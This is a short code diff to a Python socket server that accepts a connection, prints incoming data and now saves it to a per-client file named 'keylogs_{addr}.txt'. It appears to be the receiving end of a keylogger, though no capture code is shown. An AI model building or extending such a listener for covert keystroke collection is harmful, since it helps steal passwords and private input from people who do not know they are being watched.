@@ -13,15 +13,19 @@ while True:
     s.listen(5)
     print("Socket is listening...")
 
-
     c, addr = s.accept()
     print("Got connection from ", addr)
+
+    f = open(f"keylogs_{addr}.txt", "w")
     
     while True:
         try:
-            print(c.recv(1024).decode(), end="", flush=True)
+            key = c.recv(1024).decode()
+            print(key, end="", flush=True)
+            f.write(key)
         except:
             print("Client must have disconnected.")
             s.close()
+            f.close()
             break
         
